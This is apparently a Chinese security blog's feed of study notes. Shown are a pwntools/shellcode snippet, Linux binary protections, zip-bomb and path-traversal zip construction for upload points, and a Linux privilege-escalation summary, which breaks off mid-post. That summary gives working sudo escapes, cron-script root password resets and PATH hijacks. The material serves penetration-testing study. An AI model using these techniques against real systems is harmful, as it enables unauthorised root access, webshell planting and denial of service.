class="hljs-string">&#x27;\x90&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-keyword">asm</span>(<span class="hljs-string">&#x27;nop&#x27;</span>, arch=<span class="hljs-string">&#x27;arm&#x27;</span>)<br><span class="hljs-string">&#x27;\x00\xf0 \xe3&#x27;</span><br></code></pre></td></tr></table></figure><p>context指定cpu类型以及操作系统</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">context.arch      = <span class="hljs-string">&#x27;i386&#x27;</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">context.os        = <span class="hljs-string">&#x27;linux&#x27;</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">context.endian    = <span class="hljs-string">&#x27;little&#x27;</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">context.word_size = <span class="hljs-number">32</span></span><br></code></pre></td></tr></table></figure><p>反汇编</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&gt;&gt;&gt; <span class="hljs-keyword">print</span> disasm(<span class="hljs-string">&#x27;6a0258cd80ebf9&#x27;</span>.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br>   <span class="hljs-number">0</span>:   <span class="hljs-number">6</span>a <span class="hljs-number">02</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0</span>x2<br>   <span class="hljs-number">2</span>:   <span class="hljs-number">58</span>                      <span class="hljs-keyword">pop</span>    eax<br>   <span class="hljs-number">3</span>:   cd <span class="hljs-number">80</span>                   <span class="hljs-keyword">int</span>    <span class="hljs-number">0</span>x80<br>   <span class="hljs-number">5</span>:   eb f9                   jmp    <span class="hljs-number">0</span>x0<br></code></pre></td></tr></table></figure><h2 id="shellcode生成器"><a href="#shellcode生成器" class="headerlink" title="shellcode生成器"></a>shellcode生成器</h2><p>此模块经常用于可在内存中执行代码时生成shellcode，如ret2shellcode场景</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shellcode = asm(shellcraft<span class="hljs-selector-class">.i386</span><span class="hljs-selector-class">.linux</span><span class="hljs-selector-class">.sh</span>())<br>shellcode = asm(shellcraft<span class="hljs-selector-class">.amd64</span><span class="hljs-selector-class">.linux</span><span class="hljs-selector-class">.sh</span>())<br></code></pre></td></tr></table></figure><h2 id="数据pack与unpack"><a href="#数据pack与unpack" class="headerlink" title="数据pack与unpack"></a>数据pack与unpack</h2><p>pack：p32，p64<br>unpack：u32，u64<br>此模块经常用于将地址值转换二进制数据</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x401128)</span></span><br><span class="hljs-function"><span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>x402248)</span></span><br></code></pre></td></tr></table></figure><h2 id="待补充"><a href="#待补充" class="headerlink" title="待补充"></a>待补充</h2>]]></content>
    
    
    <categories>
      
      <category>二进制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux程序保护机制</title>
    <link href="/2020/02/19/linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2020/02/19/linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从创建博客到现在也不少时间了，写了不少网络安全的学习笔记，但都集中在web类漏洞中，近日为了扩展自己的知识体系，准备在二进制上下些功夫，从基础开始记录一下二进制漏洞的笔记。所以就先拿linux程序的保护机制来开个头吧。</p><p>linux系统提供了很多安全机制来降低程序受到缓冲区溢出等攻击手法的攻击，而我们需要使用这些攻击手法来进行攻击，所以就要熟悉常见的安全机制，知己知彼，才能成功实施攻击。</p><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksec是一个检查linux程序开启的安全机制的shell脚本，脚本并不大，可以直接从github下载并使用：<br><a href="https://github.com/slimm609/checksec.sh/">https://github.com/slimm609/checksec.sh/</a></p><p>gdb的peda插件也带有checksec脚本，由于我们之后还要频繁使用gdb的分析二进制程序，所以直接使用gdb-peda中的checksec</p><p>gdb-peda安装：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/longld/</span>peda.git ~/peda<br>$ echo <span class="hljs-string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit <br></code></pre></td></tr></table></figure><p>安装完成后原本的gdb会变成gdb-peda</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_protect/sec01.png"></p><p>随便使用一个程序尝试一下checksec</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_protect/sec02.png"></p><h2 id="CANARY"><a href="#CANARY" class="headerlink" title="CANARY"></a>CANARY</h2><p>CANARY是金丝雀的意思，来源于”金丝雀与矿工”的故事，金丝雀曾经经常被用作煤矿开采的预警系统。矿井中的一氧化碳或甲烷等有毒气体会在影响矿工之前杀死这些金丝雀，矿工们会根据金丝雀的状态,判断矿井是否安全。</p><p>和金丝雀的作用类似，在linux程序中，CANARY是一种栈保护机制，栈保护机制开启后，函数执行时会先往栈中插入随机值，这个随机值就被称为CANARY，当函数返回时，会先验证这个随机数是否被更改，如果被更改说明有栈溢出行为，就会使程序强制停止，从而规避栈溢出带来的危害。</p><p>canary所在位置图解：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">  High<br>  Address |<span class="hljs-string">                 </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> args            </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> return address  </span>|<br>          +-----------------+<br>  rbp =&gt;  |<span class="hljs-string"> old ebp         </span>|<br>          +-----------------+<br>rbp-8 =&gt;  |<span class="hljs-string"> canary value    </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> 局部变量        </span>|<br>  Low     |<span class="hljs-string">                 </span>|<br>  Address<br></code></pre></td></tr></table></figure><p>gcc编译时，可通过编译选项选择是否启用canary机制</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-fno-stack-protector 禁用栈保护</span><br><span class="hljs-deletion">-fstack-protector 启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="hljs-deletion">-fstack-protector-all 启用堆栈保护，为所有函数插入保护代码</span><br></code></pre></td></tr></table></figure><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>FORTIFY机制用于检查程序是否存在缓冲区溢出错误，适用于memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets等函数。</p><p>在函数编译时，加入FORTIFY机制的代码会在编译过程中自动添加一部分代码，判断数组的大小，削减缓冲区溢出的危害。</p><p>gcc编译时，默认不开启FORTIFY机制，可通过编译选项选择开启的FORTIFY机制强度</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-D_FORTIFY_SOURCE</span>=1 仅仅只会在编译时进行检查<br>gcc <span class="hljs-attribute">-D_FORTIFY_SOURCE</span>=2<br></code></pre></td></tr></table></figure><h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX是No-eXecute的缩写，设置NX会限制数据页面内存中不可执行代码，若程序尝试在被限制内存中执行代码，CPU会抛出异常。这种防御手段可以很好的克制ret2shellcode方式的攻击手段。</p><p>gcc默认开启NX机制防止数据内存中执行代码，可以通过编译选项关闭NX机制</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">gcc</span> -z execstack 关闭NX保护<br>gcc -z noexecstack 开启NX保护<br></code></pre></td></tr></table></figure><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>PIE叫做代码部分地址无关，PIE能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为ELF共享对象。</p><p>PIE和内存地址随机化机制ASLR（address space layout randomization)会同时工作,使代码</p><p>如果不开启PIE的话，那么每次ELF文件加载的地址都是相同的。如果开启PIE，那么每次都会不同。</p><p>liunx下关闭PIE的命令如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo -s echo <span class="hljs-number">0</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>randomize_va_space<br></code></pre></td></tr></table></figure><p>gcc中可以通过编译选项选择不同强度的PIE</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata">gcc -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">// 默认情况下，不开启PIE</span><br>gcc -fpie -pie -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">// 开启PIE，此时强度为1</span><br>gcc -fPIE -pie -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">// 开启PIE，此时为最高强度2</span><br>gcc -fpic -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">// 开启PIC，此时强度为1，不会开启PIE</span><br>gcc -fPIC -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">// 开启PIC，此时为最高强度2，不会开启PIE</span><br><br></code></pre></td></tr></table></figure><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO机制全名是read only relocation，指定binary的一块区域使其权限变为只读。<br>在linux程序中，很多攻击都是由于存储数据的区域被写入恶意代码进行的，RELRO机制主要可以缓解对GOT表的攻击(Global Offset Table)</p><p>gcc中可以通过编译选项控制RELRO</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">gcc -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">// 默认情况下，是Partial RELRO</span><br>gcc -z norelro -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">// 关闭，即No RELRO</span><br>gcc -z lazy -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">// 部分开启，即Partial RELRO</span><br>gcc -z now -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">// 全部开启，即</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>二进制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zip炸弹和跨目录zip文件的构造</title>
    <link href="/2020/02/15/zip%E7%82%B8%E5%BC%B9%E5%92%8C%E8%B7%A8%E7%9B%AE%E5%BD%95zip%E6%96%87%E4%BB%B6%E7%9A%84%E6%9E%84%E9%80%A0/"/>
    <url>/2020/02/15/zip%E7%82%B8%E5%BC%B9%E5%92%8C%E8%B7%A8%E7%9B%AE%E5%BD%95zip%E6%96%87%E4%BB%B6%E7%9A%84%E6%9E%84%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在对可上传zip文件的上传点进行测试时，除了一般的上传漏洞，我们也要关注其后台代码对zip文件解压后的大小和跨目录解压问题的检查。博主在本文中将介绍测试上述两种问题所用到的zip文件如何构造。</p><h2 id="什么是zip炸弹"><a href="#什么是zip炸弹" class="headerlink" title="什么是zip炸弹"></a>什么是zip炸弹</h2><p>zip炸弹就是一个高压缩比的zip文件，它本身可能只有几M或几十M的大小，但是解压缩之后会产生巨大的数据量，会解压到几十G的大小甚至更大，这种zip文件会对解压缩的系统造成严重的资源负担，影响目标系统业务甚至达到使系统崩溃的结果。</p><h2 id="可用于攻击何种系统"><a href="#可用于攻击何种系统" class="headerlink" title="可用于攻击何种系统"></a>可用于攻击何种系统</h2><p>zip炸弹的危害主要在于它解压时消耗的资源和解压后占用的资源，所以主要会对未进行压缩文件解压后大小校验就直接解压的系统造成危害。</p><h2 id="如何制作zip炸弹"><a href="#如何制作zip炸弹" class="headerlink" title="如何制作zip炸弹"></a>如何制作zip炸弹</h2><p>制作zip炸弹的方法非常简单，我们可以使用linux自带的命令制作。</p><h3 id="1-制造一个较大的csv数据文件"><a href="#1-制造一个较大的csv数据文件" class="headerlink" title="1.制造一个较大的csv数据文件"></a>1.制造一个较大的csv数据文件</h3><p>如创建一个1G的csv数据文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=/dev/zero <span class="hljs-attribute">count</span>=$((1024*1024)) <span class="hljs-attribute">bs</span>=1024 <span class="hljs-attribute">of</span>=bigFile.csv<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip01.png"></p><p>我们也可以通过更改count的值和bs的值创建更大的csv数据文件<br>如10G的csv数据文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=/dev/zero <span class="hljs-attribute">count</span>=$((1024*1024)) <span class="hljs-attribute">bs</span>=10240 <span class="hljs-attribute">of</span>=bigFile.csv<br></code></pre></td></tr></table></figure><h3 id="2-使用zip-9命令压缩"><a href="#2-使用zip-9命令压缩" class="headerlink" title="2.使用zip -9命令压缩"></a>2.使用zip -9命令压缩</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">zip</span> -<span class="hljs-number">9</span> bigFile.<span class="hljs-built_in">zip</span> bigFile.csv<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip02.png"></p><p>可以从图中看到，1G的csv文件被压缩到了1018K，我们将这个不到1M的zip文件上传，一般都能通过网站的上传文件大小限制，对自身上传时资源耗费很低，但是服务器解压过程中和解压之后占用的资源就比较多了。</p><p>本文中用到的只是一个简单的例子，实际进攻时我们使用的zip文件解压后大小会更大，多达几十或上百TB级别，而且压缩比也会更高，压缩文件实际大小可能只有十几MB。会对服务器造成很严重的资源占用。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip03.png"></p><p>我们使用这些超高压缩比的zip文件时也不需要自己构造，github中可以找到很多已经打包好的zip炸弹。</p><h2 id="什么是zip跨目录"><a href="#什么是zip跨目录" class="headerlink" title="什么是zip跨目录"></a>什么是zip跨目录</h2><p>zip跨目录与我们常见的跨目录问题类似，都是使用../来进行相对路径的目录跨越，zip文件中携带含有../的文件，在解压过程中这些文件名被解析成相对路径，解压后就会将这些文件传递到其他目录。</p><h2 id="可用于攻击何种系统-1"><a href="#可用于攻击何种系统-1" class="headerlink" title="可用于攻击何种系统"></a>可用于攻击何种系统</h2><p>存在对zip文件解压的系统，程序实现代码未对携带的../等进行过滤，且解压时使用的解压程序没有跨目录的保护机制，这些文件才会被跨目录。</p><p>linux中默认的unzip，即使正常使用解压了含有../的zip文件，也是不会被跨目录的，但是加入-:参数就会产生这种问题。所以这类问题大多数出现在程序的实现中，程序中调用了某些方法来进行文件解压，但是没有严格判断造成的。</p><p>zip跨目录最典型的攻击手段用于存在上传后缀限制的web系统中，如某些接口仅允许上传压缩文件，上传后会自动解压，但是上传路径我们无法访问。这时候攻击者就会构造一个webshell文件并添加为携带目录信息的zip文件，被自动解压后就会将webshell解压到可访问目录，就会造成getshell。</p><h2 id="如何制作跨目录zip文件"><a href="#如何制作跨目录zip文件" class="headerlink" title="如何制作跨目录zip文件"></a>如何制作跨目录zip文件</h2><p>制作跨目录zip文件的方式很方便，我们可以先制作好再上传，也可以在上传的过程中使用burpsuite改zip文件信息来构造。需要改的信息都是相同的。</p><h3 id="1-使用notepad-修改"><a href="#1-使用notepad-修改" class="headerlink" title="1.使用notepad++修改"></a>1.使用notepad++修改</h3><p>首先我们需要创建一个文件名较长的文件，如1234567890.txt。</p><p>然后将其压缩为zip格式。</p><p>使用notepad++打开zip格式的文件，寻找两处很明显的1234567890.txt字段，修改成../../7890.txt，保存后重新打开zip文件就成功了。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip04.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip05.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip06.png"></p><p>在修改的过程中要确保修改前的文件名和修改后的文件名长度一致，由于一个../就占了三个长度，所以在前面才需要文件名较长，文件名越长，可以跨越的目录层数越多。</p><h3 id="2-使用burpsuite修改"><a href="#2-使用burpsuite修改" class="headerlink" title="2.使用burpsuite修改"></a>2.使用burpsuite修改</h3><p>上传过程中，使用burpsuite抓包，直接修改和notepad++中要修改的同样的两处字段提交即可。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传,zip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux常见提权方式总结</title>
    <link href="/2020/02/12/linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2020/02/12/linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>提权是渗透测试中重要的一步，我们通常使用各种内核漏洞的cve来进行提权，但是在本文中博主想介绍一些，由于人为配置不当造成的提权方法，开阔提权时的思路。</p><h2 id="1-crontab定时任务提权"><a href="#1-crontab定时任务提权" class="headerlink" title="1. crontab定时任务提权"></a>1. crontab定时任务提权</h2><p>crontab是cron table的简写，它是cron的配置文件，而cron是linux内置管理定时任务的进程。</p><p>我们可以通过如下指令来编辑和查看当前工作表命令 </p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">crontab</span> <span class="hljs-selector-attr">[-u username]</span>　　　　<span class="hljs-comment">//省略用户表表示操作当前用户的crontab</span><br>    <span class="hljs-selector-tag">-e</span>      (编辑工作表)<br>    <span class="hljs-selector-tag">-l</span>      (列出工作表里的命令)<br>    <span class="hljs-selector-tag">-r</span>      (删除工作表)<br></code></pre></td></tr></table></figure><p>更多的crontab操作可以参考教程 <a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a> </p><h3 id="1-1-root权限定时任务脚本普通用户可写"><a href="#1-1-root权限定时任务脚本普通用户可写" class="headerlink" title="1.1 root权限定时任务脚本普通用户可写"></a>1.1 root权限定时任务脚本普通用户可写</h3><p>以root权限执行的定时任务或其所在文件夹，低权限用户拥有写权限，则可进行提权。</p><p>示例：</p><p>切换到root用户，输入crontab -e，添加一个一分钟执行一次的shell脚本，然后赋予此脚本执行权限和其他用户可写权限。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">*<span class="hljs-regexp">/1 * * * * /</span>home<span class="hljs-regexp">/test/</span>cron.sh<br></code></pre></td></tr></table></figure><p>开启其他shell，切换到普通用户，修改脚本内容为重置root密码，或者添加此普通用户权限等操作。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">echo <span class="hljs-string">&quot;root:password&quot;</span> <span class="hljs-string">| chpasswd</span><br></code></pre></td></tr></table></figure><p>然后su root使用更改后密码切换至root</p><p>如果文件不可写而文件夹可写的情况，如下图情况，可以删除到整个路径，然后重新由普通用户创建路径和其中脚本，就变成可写的情况了。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo01.png"></p><h3 id="1-2-root权限定时任务调用的脚本普通用户可写"><a href="#1-2-root权限定时任务调用的脚本普通用户可写" class="headerlink" title="1.2 root权限定时任务调用的脚本普通用户可写"></a>1.2 root权限定时任务调用的脚本普通用户可写</h3><p>很多时候，定时任务并不是孤立存在的，它会去调用很多别的shell脚本来完成一些操作，而root权限的定时任务调用的脚本也会以root权限执行，所以我们仍需要关注其调用的其他脚本是否普通用户可写，如果可写，仍然可以提权。</p><p>查询此类脚本的方法是首先找到root的定时任务 xxx.sh，然后在文件种查找其他shell脚本即可</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;*.sh&quot;</span> xxx.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><h2 id="2-sudo脚本提权"><a href="#2-sudo脚本提权" class="headerlink" title="2. sudo脚本提权"></a>2. sudo脚本提权</h2><p>sudo脚本提权，主要和/etc/sudoers配置文件有关，主要由以下三种配置引起：</p><ul><li><p>1.在sudoers文件中配置的脚本在运行时默认以root权限执行</p></li><li><p>2.在sudoers文件中配置的文件夹，内部所有脚本默认以root权限执行</p></li><li><p>3.在sudoers文件中配置的系统命令，默认以root权限执行</p></li></ul><p>而这三种配置就引出了三种提权方式，在这里作者分别配置了，/home/test/sudotest.sh文件，/home/test/sudo文件夹，以及zip,tar,more三个命令，分别对应了上述三种情况</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo02.png"></p><h3 id="2-1-sudoers文件中配置的脚本文件"><a href="#2-1-sudoers文件中配置的脚本文件" class="headerlink" title="2.1 sudoers文件中配置的脚本文件"></a>2.1 sudoers文件中配置的脚本文件</h3><p>/etc/sudoers中配置的sudo脚本文件低权限用户是否具有写权限，具有写权限，则可进行sudo提权。</p><p>使用如下命令即可复现</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cd</span> /home/<span class="hljs-keyword">test</span><br>echo <span class="hljs-string">&quot;bin/bash&quot;</span> &gt; sudotest.<span class="hljs-keyword">sh</span><br>chmod +x sudotest.<span class="hljs-keyword">sh</span><br>sudo ./sudotest.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo03.png"></p><h3 id="2-2-sudoers文件中配置的文件夹"><a href="#2-2-sudoers文件中配置的文件夹" class="headerlink" title="2.2 sudoers文件中配置的文件夹"></a>2.2 sudoers文件中配置的文件夹</h3><p>/etc/sudoers中配置的sudo文件夹低权限用户是否具有写权限，具有写权限，则可进行sudo提权。</p><p>在之前的配置中我们可以看到，在/home/test/sudo这个test用户可控目录以test随意创建脚本使用sudo执行均是免root密码的。</p><p>使用如下命令即可复现</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cd</span> /home/<span class="hljs-keyword">test</span>/sudo<br>echo <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span><br>chmod +x <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span><br>sudo ./<span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><h3 id="2-3-使用系统命令sudo提权"><a href="#2-3-使用系统命令sudo提权" class="headerlink" title="2.3 使用系统命令sudo提权"></a>2.3 使用系统命令sudo提权</h3><p>如vi，more，less，tar，zip，awk，git，find等命令，如在/etc/sudoers中配置，即存在sudo提权</p><p>vi,more,less的命令sudo提权方式都是使用对应命令sudo打开一个文件</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">sudo vi <span class="hljs-meta">filename</span><br>sudo more <span class="hljs-meta">filename</span><br>sudo less <span class="hljs-meta">filename</span><br></code></pre></td></tr></table></figure><p>然后在打开界面输入!/bin/bash，即可获得root权限的shell</p><p>zip命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">zip</span> filename.<span class="hljs-built_in">zip</span> <span class="hljs-number">123.</span>txt -T --unzip-command=<span class="hljs-string">&quot;!/bin/bash&quot;</span><br></code></pre></td></tr></table></figure><p>awk命令</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo awk <span class="hljs-symbol">&#x27;BEGIN</span> &#123;system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure><p>git命令</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sudo git help status<br>!<span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p>find命令</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo <span class="hljs-keyword">find</span> <span class="hljs-regexp">/bin/</span> -name ls -exec <span class="hljs-regexp">/bin/</span>bash \;<br></code></pre></td></tr></table></figure><h2 id="3-环境变量提权"><a href="#3-环境变量提权" class="headerlink" title="3. 环境变量提权"></a>3. 环境变量提权</h2><h3 id="3-1-具有S权限位的脚本"><a href="#3-1-具有S权限位的脚本" class="headerlink" title="3.1 具有S权限位的脚本"></a>3.1 具有S权限位的脚本</h3><p>Linux中通过设置suid，可以让程序的执行者临时拥有属主的权限，可以使用下面的命令查找具有suid的脚本</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -<span class="hljs-builtin-name">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>然后具有s权限位的这些脚本中如果存在可控环境变量。如脚本中存在调用ps程序，我们可以在低权限用户可写目录中写一个ps文件，内容为/bin/bash，然后将此目录添加到环境变量最优先寻找的目录，再执行脚本，脚本就会以root权限触发/bin/bash，就产生了一个root权限的shell，完成提权。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; <span class="hljs-regexp">/home/</span>test/ps<br>export PATH=<span class="hljs-regexp">/home/</span>test:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><h3 id="3-2-root的环境变量设置了用户可控目录"><a href="#3-2-root的环境变量设置了用户可控目录" class="headerlink" title="3.2 root的环境变量设置了用户可控目录"></a>3.2 root的环境变量设置了用户可控目录</h3><p>root的$PATH若设置了用户可控的目录，用户可以在此可控目录写入一些命令并诱导root用户输入，在这些文件中填充修改root密码的命令或给其他用户添加权限等命令，然后当root用户被诱导输入一些环境变量中配置的指令时就会执行这些命令。通常会配置一些容易输错的单词，并在后面加入返回命令不存在的提示。</p><p>如文件名设置为whomai，与正常的命令whoami颠倒了一点顺序，有时手快会输入错误。<br>然后在whoami中配置</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 